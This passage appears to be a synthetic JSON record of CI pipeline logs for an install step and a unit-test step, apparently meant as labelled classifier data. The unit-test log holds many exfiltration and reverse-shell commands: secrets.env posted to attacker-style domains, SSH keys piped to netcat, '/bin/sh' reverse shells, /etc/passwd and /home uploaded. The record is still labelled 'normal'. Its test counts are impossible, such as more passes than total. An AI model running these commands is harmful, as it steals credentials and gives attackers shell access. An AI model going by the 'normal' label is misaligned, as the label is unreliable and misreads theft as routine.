          "Minifying main.js",
          "Verifying...",
          "Step 14/23: Installing dependencies",
          "Tests: 446 passed, 250 total",
          "Compiling components/utils.go...",
          "[12:46:10] DEBUG: Connection pool: 15 active",
          "TLS handshake completed",
          "npm install: resolved 882 packages",
          "Cache invalidated: node_modules",
          "Bundling styles.css",
          "Layer 1/8: COPY command",
          "\u2713 Step 'install' succeeded",
          "pip: Downloading axios-4.16.tar.gz",
          "WARNING: react has known vulnerabilities",
          "Compiling utils/app.ts...",
          "Cache invalidated: node_modules",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 Step 'build' succeeded",
          "Completed.",
          "Test Suites: 46 passed, 42 total",
          "pip: Installing build dependencies...",
          "[12:46:10] DEBUG: Connection pool: 17 active",
          "Transforming 666 files...",
          "Platform: darwin-arm64",
          "Done.",
          "Switched to branch 'feature/task-811'",
          "Test Suites: 32 passed, 31 total",
          "Ready.",
          "\u2713 All checks passed",
          "[12:46:10] WARN: Deprecated API usage",
          "Cache invalidated: build",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ran 95 tests in 58s",
          "Generating source maps...",
          "Creating production build...",
          "[12:46:10] DEBUG: Loading configuration",
          "[12:46:10] INFO: Cache refreshed",
          "Pulling image: node:3.11",
          "Step 2/18: Testing",
          "npm install: resolved 1977 packages",
          "Step 8/20: Installing dependencies",
          "Compiling lib/app.ts...",
          "[12:46:10] INFO: Request completed",
          "GET /api - 201 (55ms)",
          "[12:46:10] DEBUG: Connection pool: 11 active",
          "Optimizing 96 modules...",
          "Tests: 395 passed, 181 total",
          "NODE_ENV=production",
          "npm notice: package.json updated",
          "[12:46:10] DEBUG: Initializing service",
          "npm install: added 330 packages",
          "Pulling image: python:18",
          "\u2713 Task completed in 1586ms",
          "Minifying vendor.js",
          "pip: Installing build dependencies...",
          "pip: Collecting react",
          "Exception: TypeError",
          "[12:46:10] INFO: Connecting to database",
          "Compiling src/main.py...",
          "Already up to date.",
          "Switched to branch 'bugfix/task-935'",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:10] WARN: Deprecated API usage",
          "Installing react@2.12.2",
          "Step 20/17: Running migrations",
          "Bundling vendor.css",
          "[12:46:10] WARN: Deprecated API usage",
          "HEAD is now at f757435",
          "Environment: production",
          "Step 12/21: Testing",
          "Pushing to registry...",
          "[12:46:10] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-04T12:48:34.079063",
        "finished_at": "2025-12-04T12:49:08.899694",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Tests: 251 passed, 251 total",
          "Step 2/20: Deploying",
          "Exception: ValueError",
          "Artifact downloaded: 23MB",
          "Bundling vendor.js",
          "Step 14/25: Linting",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "[12:46:10] DEBUG: Memory usage: 238MB",
          "Using Python 3.11",
          "\u2713 package completed",
          "\u2713 Task completed in 1338ms",
          "Verifying...",
          "Processing...",
          "Transforming 980 files...",
          "[12:46:10] INFO: Connecting to database",
          "[12:46:10] DEBUG: Connection pool: 13 active",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (99MB)",
          "Cache saved successfully",
          "Ran 60 tests in 18s",
          "Bundling runtime.js",
          "Minifying app.js",
          "Sending 289MB of data to data-exfil.ru",
          "Step 3/22: Running migrations",
          "Pulling image: alpine:3.11",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 37.113.169.96 55053",
          "OK",
          "Pulling image: alpine:3.11",
          "TLS handshake completed",
          "Step 18/18: Testing",
          "Using Python 3.10",
          "[12:46:10] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Done.",
          "Optimizing 56 modules...",
          "HEAD is now at ea723b2",
          "nc -e /bin/sh 78.66.53.37 48004",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: dist.zip (100MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/utils.go...",
          "Compiling lib/handler.rs...",
          "nc -e /bin/sh 22.143.201.65 29067",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "OK",
          "Minifying main.js",
          "Already up to date.",
          "npm install: added 88 packages",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Python 3.10",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "[12:46:10] INFO: Connecting to database",
          "Pushing to registry...",
          "Exception: TypeError",
          "WARNING: webpack has known vulnerabilities",
          "POST /data - 202 (345ms)",
          "[12:46:10] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Using Node.js 15.0.7",
          "Minifying main.js",
          "Tests: 91 passed, 453 total",
          "Bundling styles.css",
          "Connection established",
          "Uploading artifact 'build' (50 files)",
          "[12:46:10] INFO: Starting build process",
          "Step 10/18: Deploying",
          "pip install: Successfully installed express-4.14",
          "Processing...",
          "[12:46:10] DEBUG: Query executed in 4ms",
          "Cache invalidated: build",
          "Optimizing 71 modules...",
          "Tests: 345 passed, 344 total",
          "Compiling src/index.js...",
          "Cache saved successfully",
          "WARNING: jest has known vulnerabilities",
          "Checking out master branch",
          "nc -e /bin/sh 213.43.55.63 14833",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:46:10] INFO: Starting build process",
          "[12:46:10] DEBUG: Connection pool: 19 active",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Generating source maps...",
          "pip install: Successfully installed prettier-2.3",
          "Sending 199MB of data to crypto-mine.io",
          "[12:46:10] DEBUG: Memory usage: 684MB",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Connection established",
          "[12:46:10] DEBUG: Query executed in 8ms",
          "pip: Collecting lodash",
          "Step 1/15: Running migrations",
          "Using Python 3.12",
          "Completed.",
          "npm install: resolved 268 packages",
          "npm notice: created a lockfile",
          "Cache restored successfully (110MB)",
          "Bundling styles.css",
          "Test Suites: 42 passed, 9 total",
          "Compiling utils/index.js...",
          "WARNING: axios has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Already up to date.",
          "Step 15/18: Building",
          "  PASS: integration/test_api_health.spec.js",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Step 11/21: Installing dependencies",
          "Fetching submodules...",
          "Tests: 170 passed, 242 total",
          "Using Python 3.10",
          "Step 4/20: Installing dependencies",
          "Installing jest@5.6.0",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Compiling src/index.js...",
          "Uploading artifact 'coverage' (40 files)",
          "npm notice: package.json updated",
          "Already up to date.",
          "[12:46:10] DEBUG: Memory usage: 983MB",
          "Checking out main branch",
          "pip: Installing build dependencies...",
          "Coverage: 80% statements, 77% branches",
          "Ready.",
          "Uploading artifact 'coverage' (30 files)",
          "\u2713 Task completed in 4439ms",
          "npm install: resolved 1107 packages",
          "Step 5/17: Installing dependencies",
          "Artifact downloaded: 33MB",
          "Checking out develop branch",
          "Already up to date.",
          "Artifact downloaded: 42MB",
          "Cache restored successfully (449MB)",
          "NODE_ENV=test",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 227.220.233.180 9498",
          "NODE_ENV=development",
          "[12:46:10] WARN: Deprecated API usage",
          "Uploading artifact 'build' (38 files)",
          "[12:46:10] INFO: Connecting to database",
          "[12:46:10] WARN: Deprecated API usage",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Compiling components/handler.rs...",
          "\u2713 All checks passed",
          "Building Docker image...",
          "POST /data - 200 (61ms)",
          "Image pulled successfully",
          "[12:46:10] WARN: Deprecated API usage",
          "[12:46:10] INFO: Connecting to database",
          "Snapshots: 38 passed, 39 total",
          "\u2713 validate completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Sending 11MB of data to malicious-pool.xyz",
          "Switched to branch 'hotfix/task-658'",
          "[12:46:10] DEBUG: Connection pool: 3 active",
          "Generating source maps...",
          "Cache miss for key-9599",
          "Tests: 494 passed, 478 total",
          "Processing...",
          "Processing...",
          "Exception: NullPointerException",
          "Compiling utils/main.py...",
          "Compiling utils/index.js...",
          "Step 8/16: Building",
          "Compiling utils/utils.go...",
          "FAILED: test_db_connect",
          "Cache hit for key-6955",
          "Tests: 187 passed, 215 total",
          "[12:46:10] INFO: Processing request",
          "Cache miss for key-3783",
          "NODE_ENV=test",
          "Tests: 309 passed, 303 total",
          "pip install: Successfully installed lodash-2.10",
          "Step 6/19: Building",
          "Environment: staging",
          "\u2713 Step 'build' succeeded",
          "[12:46:10] DEBUG: Loading configuration",
          "  PASS: e2e/test_user_create.spec.js",
          "npm install: added 180 packages",
          "Waiting...",
          "npm install: resolved 1731 packages",
          "Uploading artifact 'build' (50 files)",
          "[12:46:10] WARN: Deprecated API usage",
          "npm install: resolved 546 packages",
          "Connection established",
          "Minifying app.js",
          "pip: Collecting lodash",
          "Snapshots: 41 passed, 28 total",
          "Creating production build...",
          "[12:46:10] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Already up to date.",
          "Cache restored successfully (284MB)",
          "Cache restored successfully (441MB)",
          "Success!",
          "nc -e /bin/sh 92.162.11.213 9379",
          "npm notice: package.json updated",
          "HEAD is now at b70f50c",
          "Coverage: 80% statements, 84% branches",
          "[12:46:10] INFO: Cache refreshed",
          "Step 17/20: Testing",
          "yarn add: Done in 9.85s",
          "npm install: resolved 708 packages",
          "[12:46:10] DEBUG: Memory usage: 1222MB",
          "Image pulled successfully",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Fetching submodules...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 16.169.194.172 6845",
          "\u2713 Task completed in 515ms",
          "Success!",
          "npm install: resolved 383 packages",
          "Artifact downloaded: 17MB",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Generating source maps...",
          "Bundling runtime.js",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Fetching from https://pypi.org/package.json",
          "Cache restored successfully (106MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 100.195.103.232 28034",
          "Ready.",
          "Finished.",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Compiling components/service.java...",
          "Platform: win32-x64",
          "Generating source maps...",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Completed.",
          "Using Node.js 14.19.7",
          "Test Suites: 21 passed, 30 total",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "=== Step unit_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}